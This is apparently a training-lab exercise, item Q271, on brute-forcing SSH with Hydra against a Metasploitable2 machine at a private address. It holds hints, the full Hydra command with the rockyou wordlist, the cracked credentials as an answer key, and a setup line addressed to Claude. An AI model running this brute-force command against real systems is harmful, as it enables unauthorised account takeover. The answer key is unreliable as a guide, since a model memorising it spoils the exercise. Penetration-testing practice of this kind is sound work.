# Q271 — Brute Force SSH Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Brute force SSH login on target using Hydra. Use username `msfadmin` and rockyou.txt wordlist. Report the cracked password."

---

## 🎯 Flag Format

```
user=<username>; password=<cracked_pass>; service=<ssh>
```

---

## 💡 Hints

**Hint 1**

`hydra -l <user> -P <wordlist> <target> ssh`

**Hint 2**

`hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 ssh -t 4`

---

## ✅ Solution

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 ssh -t 4
```

**Answer:** `user=msfadmin; password=msfadmin; service=ssh`

---

## 🤖 Claude Setup Prompt

Ensure SSH running on Metasploitable2 port 22. Report back: "Lab ready for Q271"
